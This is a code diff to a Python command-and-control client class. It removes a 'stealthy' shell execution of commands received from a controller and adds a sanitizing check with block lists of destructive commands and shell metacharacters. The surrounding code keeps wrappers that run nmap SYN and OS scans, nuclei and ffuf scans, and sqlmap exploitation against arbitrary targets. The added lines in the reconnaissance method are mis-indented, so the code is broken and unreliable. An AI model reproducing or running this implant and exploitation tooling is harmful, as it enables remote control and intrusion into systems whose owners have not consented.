@@ -226,23 +226,31 @@ class C2Client:
         return beacon
     
     def _execute_command(self, command: str) -> Dict[str, Any]:
-        """Execute received command stealthily"""
+        """Execute command with proper validation and sanitization"""
         try:
-            # Add to command history
-            self.command_history.append({
-                'command': command,
-                'timestamp': int(time.time())
-            })
+            # Validate and sanitize command
+            if not self._is_safe_command(command):
+                return {
+                    'success': False,
+                    'error': 'Command contains unsafe characters or patterns',
+                    'return_code': -1
+                }
             
-            # Check for special tool commands
-            if self._is_tool_command(command):
-                return self._execute_tool_command(command)
+            # Split command into parts for safe execution
+            import shlex
+            parts = shlex.split(command)
             
-            # Execute command
-            if platform.system() == 'Windows':
-                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
-            else:
-                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
+            # Check for dangerous commands
+            dangerous_commands = ['rm', 'del', 'format', 'dd', 'mkfs', 'fdisk', 'shutdown', 'reboot', 'halt']
+            if any(cmd in parts[0].lower() for cmd in dangerous_commands):
+                return {
+                    'success': False,
+                    'error': 'Dangerous command blocked',
+                    'return_code': -1
+                }
+            
+            # Execute command safely without shell=True
+            result = subprocess.run(parts, capture_output=True, text=True, timeout=30)
             
             return {
                 'success': result.returncode == 0,
@@ -278,7 +286,8 @@ class C2Client:
             args = parts[1:] if len(parts) > 1 else []
             
             # Check if tool is installed
-            if not ToolManager.is_tool_installed(tool):
+            tool_manager = ToolManager()
+            if not tool_manager.is_tool_installed(tool_name=tool):
                 return {
                     'success': False,
                     'error': f'Tool {tool} not installed',
@@ -312,13 +321,39 @@ class C2Client:
                 'return_code': -1
             }
 
+    def _is_safe_command(self, command: str) -> bool:
+        """Validate command for safety"""
+        # Check for dangerous patterns
+        dangerous_patterns = [
+            '&&', '||', ';', '|', '>', '<', '`', '$(',
+            'eval', 'exec', 'system', 'os.system',
+            'subprocess', 'import', 'from', 'class',
+            'def ', 'lambda', 'globals', 'locals'
+        ]
+        
+        command_lower = command.lower()
+        for pattern in dangerous_patterns:
+            if pattern in command_lower:
+                return False
+        
+        # Check for file path traversal
+        if '..' in command or '~' in command:
+            return False
+        
+        # Check for absolute paths (only allow relative or system commands)
+        if command.startswith('/') or command.startswith('\\'):
+            return False
+        
+        return True
+
     def execute_reconnaissance(self, target: str, scan_type: str = 'basic') -> Dict[str, Any]:
         """Execute reconnaissance using external tools"""
         try:
             if scan_type == 'basic':
                 # Basic port scan with nmap
-                if not ToolManager.is_tool_installed('nmap'):
-                    return {'success': False, 'error': 'Nmap not installed'}
+                            tool_manager = ToolManager()
+            if not tool_manager.is_tool_installed(tool_name='nmap'):
+                return {'success': False, 'error': 'Nmap not installed'}
                 
                 cmd = ['nmap', '-sS', '-sV', '-O', '--top-ports', '100', target]
                 result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
@@ -333,7 +368,7 @@ class C2Client:
                 
             elif scan_type == 'web':
                 # Web vulnerability scan with nuclei
-                if not ToolManager.is_tool_installed('nuclei'):
+                if not tool_manager.is_tool_installed(tool_name='nuclei'):
                     return {'success': False, 'error': 'Nuclei not installed'}
                 
                 cmd = ['nuclei', '-u', target, '-silent', '-json']
@@ -349,7 +384,7 @@ class C2Client:
                 
             elif scan_type == 'directory':
                 # Directory enumeration with ffuf
-                if not ToolManager.is_tool_installed('ffuf'):
+                if not tool_manager.is_tool_installed(tool_name='ffuf'):
                     return {'success': False, 'error': 'FFuF not installed'}
                 
                 cmd = ['ffuf', '-u', f'{target}/FUZZ', '-w', '/usr/share/wordlists/dirb/common.txt', '-mc', '200,301,302,403']
@@ -374,8 +409,9 @@ class C2Client:
     def execute_exploitation(self, target: str, exploit_type: str, payload: Optional[str] = None) -> Dict[str, Any]:
         """Execute exploitation using external tools"""
         try:
+            tool_manager = ToolManager()
             if exploit_type == 'sqlmap':
-                if not ToolManager.is_tool_installed('sqlmap'):
+                if not tool_manager.is_tool_installed(tool_name='sqlmap'):
                     return {'success': False, 'error': 'SQLMap not installed'}
                 
                 cmd = ['sqlmap', '-u', target, '--batch', '--random-agent', '--level=1', '--risk=1']
@@ -393,7 +429,7 @@ class C2Client:
                 }
                 
             elif exploit_type == 'nuclei':
-                if not ToolManager.is_tool_installed('nuclei'):
+                if not tool_manager.is_tool_installed(tool_name='nuclei'):
                     return {'success': False, 'error': 'Nuclei not installed'}
                 
                 cmd = ['nuclei', '-u', target, '-silent', '-json']
